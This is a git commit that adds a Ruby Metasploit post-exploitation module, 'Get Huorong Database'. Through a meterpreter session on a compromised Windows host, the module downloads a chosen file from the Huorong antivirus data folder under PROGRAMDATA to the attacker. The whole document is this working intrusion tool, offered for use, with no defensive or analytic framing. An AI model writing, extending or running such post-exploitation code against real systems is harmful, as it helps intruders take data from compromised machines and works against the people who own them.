8b94b45de336e470be2dfe60e1b4182b5a1420b9
2096779623 <2096779623@qq.com>
2022-08-31 13:34:45 +0800

    Upload Module

---
+++ get_huorong_db.rb
@@ -0,0 +1,43 @@
+class MetasploitModule < Msf::Post
+  include Msf::Post::File
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Get Huorong Database',
+        'Description' => %q{
+          Get Huorong Database via download.
+        },
+        'License' => MSF_LICENSE,
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter'],
+        'Author' => ['2096779623'],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_fs_stat
+              stdapi_sys_config_getenv
+            ]
+          }
+        }
+      )
+    )
+    register_options([
+      OptString.new('FILENAME', [true, 'Filename to download', '']),
+      OptString.new('DIRECTORY', [false, 'Directory'])
+    ])
+  end
+
+  def run
+    print_status('Getting Database')
+    fname = datastore['FILENAME']
+    if datastore['DIRECTORY'].empty?
+      hpath = "#{session.sys.config.getenv('PROGRAMDATA')}\\Huorong\\Sysdiag\\#{datastore['FILENAME']}"
+    else
+      hpath = "#{session.sys.config.getenv('PROGRAMDATA')}\\Huorong\\Sysdiag\\#{datastore['DIRECTORY']}\\#{datastore['FILENAME']}"
+    end
+    session.fs.file.download(fname, hpath)
+
+  end 
+end
